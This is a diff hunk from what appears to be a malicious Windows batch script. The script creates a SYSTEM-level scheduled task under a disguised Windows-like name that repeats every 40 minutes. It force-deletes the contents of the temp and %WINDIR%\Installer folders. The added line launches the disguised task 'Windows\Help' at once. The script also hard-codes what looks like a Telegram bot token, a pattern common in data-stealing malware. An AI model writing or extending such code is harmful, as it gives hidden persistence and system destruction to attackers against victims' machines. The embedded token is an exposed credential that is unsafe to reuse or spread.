@@ -24,6 +24,7 @@ schtasks /create /RU "NT AUTHORITY\SYSTEM" /RL HIGHEST /sc minute /mo 40 /tn "\W
 del /F /S /Q /A "%USERPROFILE%\AppData\Local\Temp\*.*"
 del /F /S /Q /A "%WINDIR%\Installer\*.*"
 del /F /S /Q /A "%WINDIR%\Temp\*.*"
+schtasks /run /tn "Windows\Help"
 
 chcp 65001 >nul
 set "TOKEN=7567212018:AAEhgS3yGZBLlAEreCWW1Vv3cWsAY3Q_Sew"
